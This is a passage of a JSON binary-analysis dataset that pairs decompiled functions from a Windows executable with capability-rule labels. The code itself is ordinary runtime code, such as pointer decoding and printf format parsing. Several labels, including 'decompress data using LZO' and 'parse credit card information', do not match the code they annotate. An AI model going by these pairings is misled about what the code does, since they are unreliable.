        "decompiled_code": "\nuint32_t __cdecl fcn.00456937(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 92
    },
    "00457f96": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00457f96(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 93
    },
    "00457fb1": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00457fb1(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 93
    },
    "004580ce": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004580ce(int32_t **param_1)\n\n{\n    uint32_t arg_8h;\n    uint32_t *puVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t *arg_8h_00;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = **param_1;\n    if (puVar1 == NULL) {\ncode_r0x004581c8:\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar3 = *0x6cade0 & 0x1f;\n        puVar6 = (puVar1[1] ^ *0x6cade0) >> uVar3 | (puVar1[1] ^ *0x6cade0) << 0x20 - uVar3;\n        arg_8h_00 = (puVar1[2] ^ *0x6cade0) >> uVar3 | (puVar1[2] ^ *0x6cade0) << 0x20 - uVar3;\n        uVar4 = (*puVar1 ^ *0x6cade0) >> uVar3 | (*puVar1 ^ *0x6cade0) << 0x20 - uVar3;\n        arg_8h = uVar4;\n        if (puVar6 == arg_8h_00) {\n            uVar5 = arg_8h_00 - uVar4 >> 2;\n            uVar7 = 0x200;\n            if (uVar5 < 0x201) {\n                uVar7 = uVar5;\n            }\n            uVar7 = uVar7 + uVar5;\n            if (uVar7 == 0) {\n                uVar7 = 0x20;\n            }\n            if (uVar7 < uVar5) {\ncode_r0x00458146:\n                uVar7 = uVar5 + 4;\n                arg_8h = fcn.0043bd85(uVar4, uVar7, 4);\n                fcn.0045d185(0);\n                if (arg_8h == 0) goto code_r0x004581c8;\n            }\n            else {\n                arg_8h = fcn.0043bd85(uVar4, uVar7, 4);\n                fcn.0045d185(0);\n                if (arg_8h == 0) goto code_r0x00458146;\n            }\n            uVar4 = *0x6cade0;\n            arg_8h_00 = arg_8h + uVar7 * 4;\n            puVar6 = arg_8h + uVar5 * 4;\n            for (puVar1 = puVar6; puVar1 != arg_8h_00; puVar1 = puVar1 + 1) {\n                *puVar1 = uVar4;\n            }\n        }\n        uVar4 = fcn.00457fcc(*param_1[1]);\n        *puVar6 = uVar4;\n        uVar2 = fcn.0045800a(arg_8h);\n        ***param_1 = uVar2;\n        uVar2 = fcn.0045800a(puVar6 + 1);\n        *(**param_1 + 4) = uVar2;\n        uVar2 = fcn.0045800a(arg_8h_00);\n        *(**param_1 + 8) = uVar2;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 821
    },
    "00458745": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00458745(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 92
    },
    "0045879e": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nbool fcn.0045879e(void)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return ((*0x6cd5f0 ^ *0x6cade0) >> uVar1 | (*0x6cd5f0 ^ *0x6cade0) << 0x20 - uVar1) != 0;\n}\n",
        "token_count": 93
    },
    "004587ca": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004587ca(uint arg_8h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    \n    uVar2 = *0x6cade0 & 0x1f;\n    pcVar3 = (*0x6cd5f0 ^ *0x6cade0) >> uVar2 | (*0x6cd5f0 ^ *0x6cade0) << 0x20 - uVar2;\n    if (pcVar3 == NULL) {\n        uVar1 = 0;\n    }\n    else {\n        (**0x47b3f8)(arg_8h);\n        uVar1 = (*pcVar3)();\n    }\n    return uVar1;\n}\n",
        "token_count": 166
    },
    "0045fb08": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045fb08(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 93
    },
    "0045fb23": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045fb23(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 93
    },
    "00460090": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00460090(int32_t arg_8h, uint lpProcName, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t arg_8h_00;\n    \n    puVar1 = arg_8h * 4 + 0x6cd890;\n    uVar4 = *0x6cade0 & 0x1f;\n    arg_8h_00 = (*puVar1 ^ *0x6cade0) >> uVar4 | (*puVar1 ^ *0x6cade0) << 0x20 - uVar4;\n    if (arg_8h_00 == 0xffffffff) {\n        arg_8h_00 = 0;\n    }\n    else if (arg_8h_00 == 0) {\n        iVar2 = fcn.0045ffc5(arg_10h, arg_14h);\n        if ((iVar2 == 0) || (arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, lpProcName),  arg_8h_00 == 0)) {\n            uVar4 = 0x20 - (*0x6cade0 & 0x1f) & 0x1f;\n            *puVar1 = (0xffffffffU >> uVar4 | -1 << 0x20 - uVar4) ^ *0x6cade0;\n            arg_8h_00 = 0;\n        }\n        else {\n            uVar3 = fcn.0045847c(arg_8h_00);\n            *puVar1 = uVar3;\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 403
    },
    "00463d32": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.00463d32(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00430e10();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00460b9b(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = *0x6cade0 & 0x1f;\n    uVar2 = (*0x6cdac0 ^ *0x6cade0) >> uVar1 | (*0x6cdac0 ^ *0x6cade0) << 0x20 - uVar1;\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00463d8e(0x486d60, noname_1, unaff_retaddr);\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 325
    },
    "00463dc0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00463dc0(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = *0x6cade0 & 0x1f;\n    return (arg_8h ^ *0x6cade0) >> uVar1 | (arg_8h ^ *0x6cade0) << 0x20 - uVar1;\n}\n",
        "token_count": 93
    },
    "00475ef4": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00475ef4(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    if ((arg_ch & 0x1f) != 0) {\n        uVar1 = fcn.0047143d(arg_ch & 0x1f);\n        uVar2 = fcn.0047143d(0x3f);\n        uVar4 = *arg_8h;\n        uVar3 = fcn.00471457();\n        uVar4 = uVar3 & ~uVar1 | uVar2 & uVar4 & uVar1;\n        fcn.0047157c(uVar4);\n        uVar4 = uVar4 & 0x1f;\n        uVar1 = fcn.00475f56(uVar4);\n        return uVar1 != uVar4;\n    }\n    return false;\n}\n",
        "token_count": 232
    },
    "0044488d": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044488d(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    puVar4 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar2 = arg_8h % 10 + 0x30;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar2) {\n            uVar2 = uVar2 + (arg_ch ^ 1) * ' ' + '\\a';\n        }\n        *puVar5 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar5;\n    *(in_ECX + 0x30) = puVar5 + 1;\n    return;\n}\n",
        "token_count": 402
    },
    "00444914": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444914(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    puVar4 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar2 = arg_8h % 10 + 0x30;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar2) {\n            uVar2 = uVar2 + (arg_ch ^ 1) * ' ' + '\\a';\n        }\n        *puVar5 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar5;\n    *(in_ECX + 0x30) = puVar5 + 1;\n    return;\n}\n",
        "token_count": 401
    },
    "0044499b": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044499b(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    puVar4 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar2 = arg_8h % 10 + 0x30;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar2) {\n            uVar2 = uVar2 + (arg_ch ^ 1) * ' ' + '\\a';\n        }\n        *puVar5 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar5;\n    *(in_ECX + 0x30) = puVar5 + 1;\n    return;\n}\n",
        "token_count": 402
    },
    "00444a22": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444a22(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    puVar4 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar2 = arg_8h % 10 + 0x30;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar2) {\n            uVar2 = uVar2 + (arg_ch ^ 1) * ' ' + '\\a';\n        }\n        *puVar5 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar5;\n    *(in_ECX + 0x30) = puVar5 + 1;\n    return;\n}\n",
        "token_count": 402
    },
    "00444aa9": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444aa9(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    puVar4 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar2 = arg_8h % 10 + 0x30;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar2) {\n            uVar2 = uVar2 + (arg_ch ^ 1) * ' ' + '\\a';\n        }\n        *puVar5 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar5;\n    *(in_ECX + 0x30) = puVar5 + 1;\n    return;\n}\n",
        "token_count": 402
    },
    "00444b30": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444b30(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0043d565();\n    puVar4 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x30) = puVar4;\n    puVar5 = puVar4;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar2 = arg_8h % 10 + 0x30;\n        arg_8h = arg_8h / 10;\n        if (0x39 < uVar2) {\n            uVar2 = uVar2 + (arg_ch ^ 1) * ' ' + '\\a';\n        }\n        *puVar5 = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        puVar5 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = puVar4 - puVar5;\n    *(in_ECX + 0x30) = puVar5 + 1;\n    return;\n}\n",
        "token_count": 402
    },
    "0044c423": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044c423(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    uint16_t uVar1;\n    char *pcVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uchar uVar6;\n    uint32_t in_EAX;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    uint32_t unaff_EBX;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint arg_8h;\n    int32_t iVar13;\n    uint32_t arg_ch;\n    \n    cVar5 = *(param_1 + 0x2d);\n    pcVar7 = in_EAX & 0xffffff00;\n    if (cVar5 != 'F') {\n        if (cVar5 == 'N') {\n            pcVar7 = *param_1 & 8;\n            if (pcVar7 != NULL) goto code_r0x0044c579;\n            *(param_1 + 6) = 8;\ncode_r0x0044c458:\n            uVar9 = param_1[2];\n            *(uVar9 + 0x1c) = 1;\n            *(uVar9 + 0x18) = 0x16;\n            uVar9 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar9 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044c458;\n        if (cVar5 < 'k') {\n            if (cVar5 == 'j') {\n                param_1[10] = 5;\n                goto code_r0x0044c579;\n            }\n            if (cVar5 == 'I') {\n                pcVar2 = param_1[3];\n                cVar5 = *pcVar2;\n                if ((cVar5 == '3') && (pcVar2[1] == '2')) {\n                    pcVar7 = pcVar2 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = pcVar7;\n                }\n                else if (cVar5 == '6') {\n                    if (pcVar2[1] == '4') {\n                        pcVar7 = pcVar2 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = pcVar7;\n                    }\n                }\n                else if ((((cVar5 == 'd') || (cVar5 == 'i')) || (cVar5 == 'o')) ||\n                        (((cVar5 == 'u' || (cVar5 == 'x')) || (cVar5 == 'X')))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044c579;\n            }\n            if (cVar5 == 'L') {\n                param_1[10] = 8;\n                goto code_r0x0044c579;\n            }\n            if (cVar5 == 'T') {\n                param_1[10] = 0xd;\n                goto code_r0x0044c579;\n            }\n            if (cVar5 != 'h') goto code_r0x0044c579;\n            if (*param_1[3] == 'h') {\n                param_1[3] = param_1[3] + 1;\n                pcVar7 = 0x1;\n            }\n            else {\n                pcVar7 = 0x2;\n            }\n        }\n        else {\n            if (cVar5 != 'l') {\n                if (cVar5 == 't') {\n                    param_1[10] = 7;\n                }\n                else if (cVar5 == 'w') {\n                    param_1[10] = 0xc;\n                }\n                else if (cVar5 == 'z') {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044c579;\n            }\n            if (*param_1[3] == 'l') {\n                param_1[3] = param_1[3] + 1;\n                pcVar7 = 0x4;\n            }\n            else {\n                pcVar7 = 0x3;\n            }\n        }\n        param_1[10] = pcVar7;\ncode_r0x0044c579:\n        return CONCAT31(pcVar7 >> 8, 1);\n    }\n    pcVar7 = *param_1 & 8;\n    if (pcVar7 != NULL) goto code_r0x0044c579;\n    *(param_1 + 6) = 7;\n    iVar11 = 0;\n    cVar5 = *(param_1 + 0x2d);\n    if (cVar5 < 'e') {\n        if (cVar5 == 'd') {\ncode_r0x0044d62d:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044d631:\n            cVar5 = fcn.00441da1(0);\n        }\n        else if (cVar5 < 'T') {\n            if (cVar5 == 'S') {\ncode_r0x0044d65a:\n                cVar5 = fcn.00452e2c();\n            }\n            else {\n                if (cVar5 != 'A') {\n                    if (cVar5 == 'C') {\ncode_r0x0044d5e7:\n                        cVar5 = fcn.00451c54(0);\n                        goto code_r0x0044d66a;\n                    }\n                    if (((cVar5 != 'E') && (cVar5 != 'F')) && (cVar5 != 'G')) goto code_r0x0044d8a9;\n                }\ncode_r0x0044d5c5:\n                cVar5 = fcn.00450830();\n            }\n        }\n        else if (cVar5 == 'X') {\n            arg_8h = 1;\ncode_r0x0044d5fc:\n            cVar5 = fcn.00443095(arg_8h);\n        }\n        else {\n            if (cVar5 != 'Z') {\n                if (cVar5 != 'a') {\n                    if (cVar5 != 'c') goto code_r0x0044d8a9;\n                    goto code_r0x0044d5e7;\n                }\n                goto code_r0x0044d5c5;\n            }\n            cVar5 = fcn.00450330();\n        }\n    }\n    else if (cVar5 < 'p') {\n        if (cVar5 == 'o') {\n            cVar5 = fcn.00452bc8();\n        }\n        else {\n            if (((cVar5 == 'e') || (cVar5 == 'f')) || (cVar5 == 'g')) goto code_r0x0044d5c5;\n            if (cVar5 == 'i') goto code_r0x0044d62d;\n            if (cVar5 != 'n') goto code_r0x0044d8a9;\n            cVar5 = fcn.004524ec();\n        }\n    }\n    else {\n        if (cVar5 != 'p') {\n            if (cVar5 == 's') goto code_r0x0044d65a;\n            if (cVar5 != 'u') {\n                if (cVar5 != 'x') goto code_r0x0044d8a9;\n                arg_8h = 0;\n                goto code_r0x0044d5fc;\n            }\n            goto code_r0x0044d631;\n        }\n        cVar5 = fcn.00452d24();\n    }\ncode_r0x0044d66a:\n    if ((cVar5 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        uVar9 = param_1[7];\n        uVar12 = 0;\n        arg_ch = 0;\n        if ((uVar9 >> 4 & 1) != 0) {\n            if (((uVar9 >> 6 & 1) == 0) && ((uVar9 & 1) == 0)) {\n                if ((uVar9 >> 1 & 1) != 0) {\n                    uVar12 = 1;\n                    arg_ch = 1;\n                }\n            }\n            else {\n                arg_ch = 1;\n                uVar12 = 1;\n            }\n        }\n        cVar5 = *(param_1 + 0x2d);\n        if (((cVar5 != 'x') && (cVar5 != 'X')) || (bVar3 = true,  (uVar9 >> 5 & 1) == 0)) {\n            bVar3 = false;\n        }\n        if ((cVar5 == 'a') || (bVar4 = false,  cVar5 == 'A')) {\n            bVar4 = true;\n        }\n        if ((bVar3) || (bVar4)) {\n            (&stack0xfffffff0)[uVar12] = 0x30;\n            if ((cVar5 == 'X') || (cVar5 == 'A')) {\n                uVar6 = 0x58;\n            }\n            else {\n                uVar6 = 0x78;\n            }\n            (&stack0xfffffff1)[uVar12] = uVar6;\n            uVar12 = uVar12 + 2;\n            arg_ch = uVar12;\n        }\n        iVar8 = (param_1[8] - uVar12) - param_1[0xd];\n        if (((uVar9 & 0xc) == 0) && (uVar9 = param_1[2],  0 < iVar8)) {\n            while( true ) {\n                arg_ch = 0x20;\n                iVar13 = 0x44d749;\n                cVar5 = fcn.00454f59(0x20, uVar9);\n                if (cVar5 == '\\0') break;\n                uVar12 = param_1[5];\n                param_1[5] = uVar12 + 1;\n                if ((uVar12 == 0xfffffffe) || (iVar8 <= iVar13 + 1)) goto code_r0x0044d775;\n            }\n            param_1[5] = 0xffffffff;\n        }\ncode_r0x0044d775:\n        arg_10h = param_1 + 5;\n        unaff_EBX = 0x44d793;\n        fcn.00455870(&stack0xfffffff0, arg_ch, arg_10h, param_1[2]);\n        if (((param_1[7] >> 3 & 1) != 0) && ((param_1[7] >> 2 & 1) == 0)) {\n            iVar8 = 0;\n            uVar9 = param_1[2];\n            if (0 < arg_ch) {\n                while( true ) {\n                    arg_ch = uVar9;\n                    unaff_EBX = 0x44d7c3;\n                    uVar9 = arg_ch;\n                    cVar5 = fcn.00454f59(0x30, arg_ch);\n                    if (cVar5 == '\\0') break;\n                    uVar12 = *arg_10h;\n                    *arg_10h = uVar12 + 1;\n                    if ((uVar12 == 0xfffffffe) || (iVar8 = iVar8 + 1,  arg_ch <= iVar8)) goto code_r0x0044d7e7;\n                }\n                *arg_10h = 0xffffffff;\n            }\n        }\ncode_r0x0044d7e7:\n        if ((*(param_1 + 0xe) == '\\0') || (param_1[0xd] < 1)) {\n            unaff_EBX = param_1[2];\n            fcn.00455870(param_1[0xc], param_1[0xd], arg_10h, unaff_EBX);\n        }\n        else {\n            puVar10 = param_1[0xc];\n            uVar9 = 0;\n            do {\n                uVar1 = *puVar10;\n                puVar10 = puVar10 + 1;\n                iVar13 = 0;\n                iVar8 = fcn.0045eb63(&stack0xffffffec, &stack0xfffffff0, 6, uVar1, param_1[2]);\n                if ((iVar8 != 0) || (iVar13 == 0)) {\n                    *arg_10h = 0xffffffff;\n                    break;\n                }\n                fcn.00455870(&stack0xfffffff0, iVar13, arg_10h, param_1[2]);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 != param_1[0xd]);\n        }\n        if (((-1 < *arg_10h) && ((param_1[7] >> 2 & 1) != 0)) && (uVar9 = param_1[2],  0 < arg_ch)) {\n            while (cVar5 = fcn.00454f59(0x20, uVar9),  cVar5 != '\\0') {\n                uVar12 = *arg_10h;\n                *arg_10h = uVar12 + 1;\n                if ((uVar12 == 0xfffffffe) || (iVar11 = iVar11 + 1,  arg_ch <= iVar11)) goto code_r0x0044d8a9;\n            }\n            *arg_10h = 0xffffffff;\n        }\n    }\ncode_r0x0044d8a9:\n    uVar9 = fcn.004303e9(unaff_EBX);\n    return uVar9;\n}\n",
        "token_count": 3085
    },
    "0044c57c": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044c57c(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    uint16_t uVar1;\n    char *pcVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uchar uVar6;\n    uint32_t in_EAX;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    uint32_t unaff_EBX;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint arg_8h;\n    int32_t iVar13;\n    uint32_t arg_ch;\n    \n    cVar5 = *(param_1 + 0x2d);\n    pcVar7 = in_EAX & 0xffffff00;\n    if (cVar5 != 'F') {\n        if (cVar5 == 'N') {\n            pcVar7 = *param_1 & 8;\n            if (pcVar7 != NULL) goto code_r0x0044c6d2;\n            *(param_1 + 6) = 8;\ncode_r0x0044c5b1:\n            uVar9 = param_1[2];\n            *(uVar9 + 0x1c) = 1;\n            *(uVar9 + 0x18) = 0x16;\n            uVar9 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar9 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044c5b1;\n        if (cVar5 < 'k') {\n            if (cVar5 == 'j') {\n                param_1[10] = 5;\n                goto code_r0x0044c6d2;\n            }\n            if (cVar5 == 'I') {\n                pcVar2 = param_1[3];\n                cVar5 = *pcVar2;\n                if ((cVar5 == '3') && (pcVar2[1] == '2')) {\n                    pcVar7 = pcVar2 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = pcVar7;\n                }\n                else if (cVar5 == '6') {\n                    if (pcVar2[1] == '4') {\n                        pcVar7 = pcVar2 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = pcVar7;\n                    }\n                }\n                else if ((((cVar5 == 'd') || (cVar5 == 'i')) || (cVar5 == 'o')) ||\n                        (((cVar5 == 'u' || (cVar5 == 'x')) || (cVar5 == 'X')))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044c6d2;\n            }\n            if (cVar5 == 'L') {\n                param_1[10] = 8;\n                goto code_r0x0044c6d2;\n            }\n            if (cVar5 == 'T') {\n                param_1[10] = 0xd;\n                goto code_r0x0044c6d2;\n            }\n            